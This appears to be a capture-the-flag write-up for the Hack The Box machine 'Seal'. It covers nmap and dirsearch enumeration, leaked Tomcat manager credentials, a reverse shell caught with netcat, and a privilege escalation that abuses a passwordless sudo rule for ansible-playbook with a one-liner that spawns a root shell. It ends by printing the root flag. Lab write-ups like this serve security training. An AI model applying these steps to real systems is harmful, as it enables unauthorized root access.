# Seal

## Enumeration

#### Nmap

	# Nmap 7.91 scan initiated Wed Jul 14 18:25:26 2021 as: nmap -v -sC -sV -oN scan 10.129.183.174
	Increasing send delay for 10.129.183.174 from 0 to 5 due to 31 out of 101 dropped probes since last increase.
	Nmap scan report for 10.129.183.174
	Host is up (0.32s latency).
	Not shown: 997 closed ports
	PORT     STATE SERVICE    VERSION
	22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
	|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
	|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
	443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
	| http-methods: 
	|_  Supported Methods: OPTIONS GET HEAD POST
	|_http-server-header: nginx/1.18.0 (Ubuntu)
	|_http-title: Seal Market
	| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
	| Issuer: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
	| Public Key type: rsa
	| Public Key bits: 2048
	| Signature Algorithm: sha256WithRSAEncryption
	| Not valid before: 2021-05-05T10:24:03
	| Not valid after:  2022-05-05T10:24:03
	| MD5:   9c4f 991a bb97 192c df5a c513 057d 4d21
	|_SHA-1: 0de4 6873 0ab7 3f90 c317 0f7b 872f 155b 305e 54ef
	| tls-alpn: 
	|_  http/1.1
	| tls-nextprotoneg: 
	|_  http/1.1
	8080/tcp open  http-proxy
	| fingerprint-strings: 
	|   FourOhFourRequest: 
	|     HTTP/1.1 401 Unauthorized
	|     Date: Wed, 14 Jul 2021 12:58:54 GMT
	|     Set-Cookie: JSESSIONID=node016q2txdyyt12gbw7kslacd2xd2.node0; Path=/; HttpOnly
	|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
	|     Content-Type: text/html;charset=utf-8
	|     Content-Length: 0
	|   GetRequest: 
	|     HTTP/1.1 401 Unauthorized
	|     Date: Wed, 14 Jul 2021 12:58:51 GMT
	|     Set-Cookie: JSESSIONID=node01drdcpbxvdm3f121yjt90r3s3t0.node0; Path=/; HttpOnly
	|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
	|     Content-Type: text/html;charset=utf-8
	|     Content-Length: 0
	|   HTTPOptions: 
	|     HTTP/1.1 200 OK
	|     Date: Wed, 14 Jul 2021 12:58:52 GMT
	|     Set-Cookie: JSESSIONID=node0menw8751ecl0qf3pfh23ccd1.node0; Path=/; HttpOnly
	|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
	|     Content-Type: text/html;charset=utf-8
	|     Allow: GET,HEAD,POST,OPTIONS
	|     Content-Length: 0
	|   RPCCheck: 
	|     HTTP/1.1 400 Illegal character OTEXT=0x80
	|     Content-Type: text/html;charset=iso-8859-1
	|     Content-Length: 71
	|     Connection: close
	|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
	|   RTSPRequest: 
	|     HTTP/1.1 505 Unknown Version
	|     Content-Type: text/html;charset=iso-8859-1
	|     Content-Length: 58
	|     Connection: close
	|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
	|   Socks4: 
	|     HTTP/1.1 400 Illegal character CNTL=0x4
	|     Content-Type: text/html;charset=iso-8859-1
	|     Content-Length: 69
	|     Connection: close
	|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
	|   Socks5: 
	|     HTTP/1.1 400 Illegal character CNTL=0x5
	|     Content-Type: text/html;charset=iso-8859-1
	|     Content-Length: 69
	|     Connection: close
	|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
	| http-auth: 
	| HTTP/1.1 401 Unauthorized\x0D
	|_  Server returned status 401 but no WWW-Authenticate header.
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-title: Site doesn't have a title (text/html;charset=utf-8).
	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at s



	Read data files from: /usr/bin/../share/nmap
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	# Nmap done at Wed Jul 14 18:26:44 2021 -- 1 IP address (1 host up) scanned in 78.67 seconds


On port 8080 we got tomcat credentials

	<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>
		</tomcat-users>


#### Dirsearch

┌──(arundhanush㉿kali)-[~/CTF/HTB/Seal]
└─$ dirsearch -u https://seal.htb                                               
/home/arundhanush/.local/lib/python3.9/site-packages/requests/__init__.py:89: Re version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "

  _|. _ _  _  _  _ _|_    v0.4.1                                                
 (_||| _) (/_(_|| (_| )                                                         
                                                                                
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist

Output File: /home/arundhanush/.dirsearch/reports/seal.htb/_21-09-05_09-53-12.tx

Error Log: /home/arundhanush/.dirsearch/logs/errors-21-09-05_09-53-12.log

Target: https://seal.htb/
                                                                                
	[09:53:19] Starting: 
	[09:53:28] 302 -    0B  - /js  ->  http://seal.htb/js/
	[09:54:07] 400 -  804B  - /\..\..\..\..\..\..\..\..\..\etc\passwd      
	[09:54:10] 400 -  804B  - /a%5c.aspx                                      
	[09:54:14] 302 -    0B  - /admin  ->  http://seal.htb/admin/                   
	[09:54:44] 302 -    0B  - /css  ->  http://seal.htb/css/                       
	[09:54:55] 302 -    0B  - /host-manager/  ->  http://seal.htb/host-manager/html
	[09:54:55] 403 -  564B  - /host-manager/html
	[09:54:56] 302 -    0B  - /icon  ->  http://seal.htb/icon/                   
	[09:54:57] 302 -    0B  - /images  ->  http://seal.htb/images/                 
	[09:54:58] 200 -   19KB - /index.html                                    
	[09:55:05] 403 -  564B  - /manager/html/                                      
	[09:55:05] 403 -  564B  - /manager/html
	[09:55:05] 302 -    0B  - /manager/  ->  http://seal.htb/manager/html
	[09:55:05] 401 -    2KB - /manager/status/all          
	[09:55:06] 302 -    0B  - /manager  ->  http://seal.htb/manager/     
	                                                                            
	Task Completed      

In this dirsearch /manager/status/all is tomcat we would login with our crendentials


its tomcat/9.0.31 vulnerable to path traversal we have to upload a file  

┌──(arundhanush㉿kali)-[~/CTF/HTB/Seal]
└─$ nc -nlvp 1234                                                                                                                                               130 ⨯
Listening on 0.0.0.0 1234
Connection received on 10.10.10.250 42398
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@seal:/var/lib/tomcat9$    


## Privesc

	luis@seal:~$ sudo -l
	Matching Defaults entries for luis on seal:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User luis may run the following commands on seal:
	    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
	luis@seal:~$ TF=$(mktemp)
	luis@seal:~$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
	luis@seal:~$ sudo ansible-playbook $TF
	[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

	PLAY [localhost] *****************************************************************************************************************************************************

	TASK [Gathering Facts] ***********************************************************************************************************************************************
	ok: [localhost]

	TASK [shell] *********************************************************************************************************************************************************
	# id
	uid=0(root) gid=0(root) groups=0(root)
	# cd /root
	# cat root.txt  
	cee3055bda7cb9020601d6124a74d95e
	# 
